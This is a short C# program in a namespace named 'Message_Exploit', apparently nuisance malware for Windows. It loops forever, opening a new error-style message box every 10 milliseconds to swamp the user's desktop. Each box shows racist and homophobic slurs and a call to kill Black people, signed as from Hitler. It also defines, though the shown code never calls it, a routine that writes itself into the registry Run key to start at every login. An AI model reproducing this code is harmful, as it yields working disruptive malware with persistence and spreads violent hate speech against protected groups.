using System.Windows.Forms;
using Microsoft.Win32;
using System.Threading;

namespace Message_Exploit
{
    class Spamming
    {
        static void Main()
        {
            Spamming sc = new Spamming();
            Thread thread = new Thread(sc.Payload);
            thread.Start();
        }
        private void RegisterInStartup(bool isChecked)
        {
            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            if (isChecked)
            {
                registryKey.SetValue("Loader", Application.ExecutablePath);
            }
            else
            {
                registryKey.DeleteValue("Loader");
            }
        }
        public void Messages_Box()
        {
            MessageBox.Show("I Hate NIGGER AND GAY , KILL ALL NIGGER!!!", "Message of Hitler", MessageBoxButtons.OK, MessageBoxIcon.Error);
        }
        public void Payload()
        {
            while (true)
            {
                Thread MS = new Thread(Messages_Box);
                MS.Start();
                Thread.Sleep(10);
            }
        }
    }
}